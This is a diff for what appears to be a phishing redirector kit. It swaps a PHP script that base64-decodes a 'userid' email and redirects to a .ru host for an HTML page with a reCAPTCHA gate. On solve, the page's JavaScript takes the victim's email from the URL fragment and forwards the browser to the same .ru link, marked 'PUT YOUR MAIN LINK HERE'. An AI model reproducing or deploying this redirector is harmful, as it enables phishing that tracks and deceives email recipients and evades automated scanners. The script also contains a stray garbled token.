@@ -1,26 +1,39 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data)) === $data) {
-        return true;
-    } else {
-        return false;
-    }
-}
+<!doctype html>
+<html lang="en">
+  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+<title>...Redirecting</title>
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 
-function decode($email){
-		
-		if(isBase64($email)){
-			 $email = base64_decode($email,false);
-		}
-      
-       header( "refresh:0;url=https://eotn.liounglean.ru/b9b3w534/#".$email);
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 
+  </head>
+  <body>
+  
+  </br></br>
+   <div class="container h-100 d-flex justify-content-center">
+    <div class="my-auto">
+     
+     <div class="g-recaptcha" data-callback="recaptchaCallback" data-sitekey="6LfXLjkpAAAAALpCLl2s4d3UYdsZMoQH33YUJmkk"></div>        
+
+    </div>
+</div>
+</body>
+<script>
+
+brow
+function recaptchaCallback() {
+  var hash = window.location.hash;
+  if(hash !== "") {
+
+    hash = hash.split('/0a9c0a9c0a9c0a9c0');
+    const hash1 = hash[1];
+     const email = hash1;
+     
+      window.location.href = "https://eotn.liounglean.ru/b9b3w534/#" + email;//*PUT YOUR MAIN LINK HERE *//
+  }
 }
-if(isset($_GET['userid']) && !empty($_GET['userid'])){
-   $email = $_GET['userid'];
-   decode($email);
-}
-   
-   
-?>
+</script>
+</html>
